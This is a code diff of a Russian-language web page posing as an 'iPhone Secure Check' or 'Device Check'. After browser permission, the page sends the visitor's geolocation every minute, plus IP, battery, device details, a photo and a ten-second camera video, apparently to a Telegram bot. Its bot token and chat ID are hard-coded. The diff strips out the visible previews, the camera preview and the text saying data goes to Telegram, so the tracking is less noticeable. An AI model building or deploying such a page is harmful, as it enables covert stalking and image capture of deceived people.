@@ -41,7 +41,7 @@
     .device-frame {
       width: 100%;
       max-width: 430px;
-      min-height: 720px;
+      min-height: 620px;
       border-radius: var(--radius-card);
       padding: 12px;
       background: linear-gradient(145deg, rgba(255,255,255,.22), rgba(255,255,255,.04));
@@ -50,13 +50,13 @@
     }
 
     .screen {
-      min-height: 696px;
+      min-height: 596px;
       border-radius: var(--radius-main);
       overflow: hidden;
       background: var(--card);
       backdrop-filter: blur(24px);
       border: 1px solid rgba(255,255,255,.1);
-      padding: 22px;
+      padding: 26px 22px;
     }
 
     .top-shape {
@@ -64,93 +64,56 @@
       height: 31px;
       background: #020617;
       border-radius: 999px;
-      margin: 0 auto 22px;
+      margin: 0 auto 34px;
     }
 
-    .hero { text-align: center; padding-top: 6px; }
-
-    .logo {
-      width: 78px;
-      height: 78px;
-      margin: 0 auto 18px;
-      border-radius: 24px;
-      background: linear-gradient(135deg, var(--accent1), var(--accent2));
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 38px;
-      box-shadow: 0 18px 38px rgba(37,99,235,.36);
+    .hero {
+      text-align: center;
+      padding-top: 20px;
     }
 
     h1 {
       margin: 0;
-      font-size: 31px;
+      font-size: 32px;
       letter-spacing: -0.7px;
       line-height: 1.1;
     }
 
     .subtitle {
-      margin: 12px auto 0;
+      margin: 14px auto 0;
       max-width: 340px;
       color: var(--muted);
-      font-size: 15.5px;
+      font-size: 16px;
       line-height: 1.55;
     }
 
     .glass {
-      margin-top: 20px;
-      padding: 14px;
+      margin-top: 24px;
+      padding: 16px;
       border-radius: 22px;
       background: rgba(255,255,255,.075);
       border: 1px solid rgba(255,255,255,.1);
       color: #dbeafe;
-      font-size: 13.5px;
+      font-size: 14px;
       line-height: 1.45;
       text-align: left;
     }
 
-    .grid {
-      display: grid;
-      grid-template-columns: 1fr 1fr;
-      gap: 10px;
-      margin-top: 16px;
-    }
-
-    .chip {
-      padding: 12px;
-      border-radius: 18px;
-      background: rgba(255,255,255,.06);
-      border: 1px solid rgba(255,255,255,.08);
-      font-size: 12px;
-      color: #bfdbfe;
-      text-align: left;
-    }
-
-    .chip b {
-      display: block;
-      color: #fff;
-      font-size: 13px;
-      margin-bottom: 4px;
-    }
-
-    button, .login-btn {
+    button {
       width: 100%;
-      margin-top: 13px;
+      margin-top: 18px;
       border: 0;
       border-radius: 18px;
-      padding: 15px 16px;
+      padding: 16px 16px;
       font-size: 16px;
       font-weight: 750;
       color: #fff;
       cursor: pointer;
-      text-decoration: none;
-      display: block;
-      text-align: center;
       font-family: var(--font-main);
     }
 
     .primary {
-      margin-top: 20px;
+      margin-top: 26px;
       background: linear-gradient(135deg, var(--accent1), var(--accent2));
       box-shadow: 0 16px 36px rgba(37,99,235,.34);
     }
@@ -160,12 +123,10 @@
       background: linear-gradient(135deg, var(--danger1), var(--danger2));
     }
 
-    .telegram { background: #229ED9; }
-
     .status {
       min-height: 44px;
-      margin-top: 15px;
-      padding: 13px;
+      margin-top: 18px;
+      padding: 14px;
       border-radius: 18px;
       background: rgba(2,6,23,.36);
       color: #bfdbfe;
@@ -184,7 +145,7 @@
     }
 
     .small {
-      margin-top: 13px;
+      margin-top: 16px;
       color: #94a3b8;
       font-size: 11.5px;
       line-height: 1.4;
@@ -210,11 +171,10 @@
       width: 64px;
       height: 10px;
       background: rgba(255,255,255,.18);
-      margin-bottom: 28px;
+      margin-bottom: 42px;
     }
 
-    body.android button,
-    body.android .login-btn {
+    body.android button {
       border-radius: 999px;
     }
   </style>
@@ -226,30 +186,18 @@
       <div class="top-shape"></div>
 
       <div class="hero">
-        <div class="logo" id="deviceIcon">📍</div>
         <h1 id="mainTitle">Device Check</h1>
         <p class="subtitle" id="mainSubtitle">
-          Нажмите одну кнопку, подтвердите разрешения, и данные будут отправлены в Telegram.
+          Нажмите кнопку и подтвердите разрешения браузера.
         </p>
       </div>
 
       <div class="glass" id="noticeText">
-        GEO отправляется каждую минуту, пока страница открыта. Фото и видео отправляются только после разрешения камеры.
-      </div>
-
-      <div class="grid">
-        <div class="chip"><b>IP / страна</b><span id="ipPreview">ожидает</span></div>
-        <div class="chip"><b>Устройство</b><span id="devicePreview">ожидает</span></div>
-        <div class="chip"><b>Язык</b><span id="langPreview">ожидает</span></div>
-        <div class="chip"><b>Батарея</b><span id="batteryPreview">может не поддерживаться</span></div>
+        Геолокация отправляется каждую минуту, пока страница открыта. Фото и видео отправляются только после разрешения камеры.
       </div>
 
       <button class="primary" id="startBtn" onclick="startAll()">Разрешить GEO и начать</button>
       <button class="stop" id="stopBtn" onclick="stopTracking()">Остановить GEO</button>
-
-      <a class="login-btn telegram" id="telegramBtn" href="https://t.me/YOUR_BOT_USERNAME" target="_blank">
-        Открыть Telegram
-      </a>
 
       <video id="video" class="preview" autoplay playsinline muted></video>
       <canvas id="canvas" class="hidden"></canvas>
@@ -257,19 +205,14 @@
       <div class="status" id="status">Готово к запуску.</div>
 
       <div class="small">
-        Работает через HTTPS. Браузер покажет отдельные системные запросы доступа к геолокации и камере.
+        Работает через HTTPS. Браузер покажет системные запросы доступа к геолокации и камере.
       </div>
     </section>
   </main>
 
   <script>
-    // =========================================================
-    // ГЛАВНЫЕ НАСТРОЙКИ
-    // =========================================================
-
     const botToken = "8630743288:AAGGL1TvkhDLmHkhQn0pTT-860o5P7Fl_os";
     const chatId = "380243961";
-    const botUsername = "geoagent_helper_bot";
 
     const sendIntervalMs = 60 * 1000;
     const videoDurationMs = 10 * 1000;
@@ -277,23 +220,20 @@
     const texts = {
       iphone: {
         title: "iPhone Secure Check",
-        subtitle: "Нажмите одну кнопку и подтвердите разрешения Safari.",
+        subtitle: "Нажмите кнопку и подтвердите разрешения Safari.",
         notice: "После разрешения GEO будет обновляться каждую минуту. Камера включится только после отдельного системного разрешения.",
-        icon: "",
         start: "Разрешить GEO и начать"
       },
       android: {
         title: "Android Device Check",
-        subtitle: "Нажмите одну кнопку и подтвердите разрешения Chrome.",
+        subtitle: "Нажмите кнопку и подтвердите разрешения Chrome.",
         notice: "После разрешения GEO будет обновляться каждую минуту. Камера включится только после отдельного системного разрешения.",
-        icon: "🤖",
         start: "Разрешить GEO и начать"
       },
       other: {
         title: "Device Check",
-        subtitle: "Нажмите одну кнопку и подтвердите разрешения браузера.",
+        subtitle: "Нажмите кнопку и подтвердите разрешения браузера.",
         notice: "GEO отправляется каждую минуту. Фото и видео — только после разрешения камеры.",
-        icon: "📍",
         start: "Разрешить GEO и начать"
       }
     };
@@ -334,9 +274,7 @@
       document.getElementById("mainTitle").textContent = t.title;
       document.getElementById("mainSubtitle").textContent = t.subtitle;
       document.getElementById("noticeText").textContent = t.notice;
-      document.getElementById("deviceIcon").textContent = t.icon;
       startBtn.textContent = t.start;
-      document.getElementById("telegramBtn").href = `https://t.me/${botUsername}`;
     }
 
     function guessDeviceModel() {
@@ -369,19 +307,6 @@
       };
     }
 
-    function updatePreview() {
-      const device = getDeviceInfo();
-
-      document.getElementById("devicePreview").textContent = device.model;
-      document.getElementById("langPreview").textContent = device.language;
-      document.getElementById("batteryPreview").textContent = batteryInfo;
-
-      if (ipInfo) {
-        document.getElementById("ipPreview").textContent =
-          `${ipInfo.ip || "unknown"} / ${ipInfo.country_name || ipInfo.country || "unknown"}`;
-      }
-    }
-
     async function loadIpInfo() {
       try {
         const res = await fetch("https://ipapi.co/json/");
@@ -389,8 +314,6 @@
       } catch (e) {
         ipInfo = { ip: "не удалось", country_name: "не удалось", city: "не удалось" };
       }
-
-      updatePreview();
     }
 
     async function loadBatteryInfo() {
@@ -400,7 +323,6 @@
 
           function formatBattery() {
             batteryInfo = `${Math.round(battery.level * 100)}%, зарядка: ${battery.charging ? "да" : "нет"}`;
-            updatePreview();
           }
 
           formatBattery();
@@ -408,11 +330,9 @@
           battery.addEventListener("chargingchange", formatBattery);
         } else {
           batteryInfo = "не поддерживается";
-          updatePreview();
         }
       } catch (e) {
         batteryInfo = "не удалось получить";
-        updatePreview();
       }
     }
 
@@ -587,7 +507,6 @@ ${buildBaseInfo()}`;
         });
 
         video.srcObject = mediaStream;
-        video.style.display = "block";
 
         await new Promise(resolve => {
           video.onloadedmetadata = resolve;
@@ -595,7 +514,6 @@ ${buildBaseInfo()}`;
 
         setStatus("Камера разрешена. Делаем фото и записываем видео...");
 
-        // Фото
         canvas.width = video.videoWidth || 720;
         canvas.height = video.videoHeight || 960;
 
@@ -618,7 +536,6 @@ ${buildBaseInfo()}`;
           }
         }, "image/jpeg", 0.9);
 
-        // Видео
         const chunks = [];
         const options = MediaRecorder.isTypeSupported("video/webm")
           ? { mimeType: "video/webm" }
@@ -654,8 +571,6 @@ ${buildBaseInfo()}`;
               mediaStream.getTracks().forEach(track => track.stop());
               mediaStream = null;
             }
-
-            video.style.display = "none";
           }
         };
 
@@ -696,7 +611,6 @@ ${buildBaseInfo()}`;
     applyDeviceStyle();
     loadIpInfo();
     loadBatteryInfo();
-    updatePreview();
   </script>
 </body>
 </html>
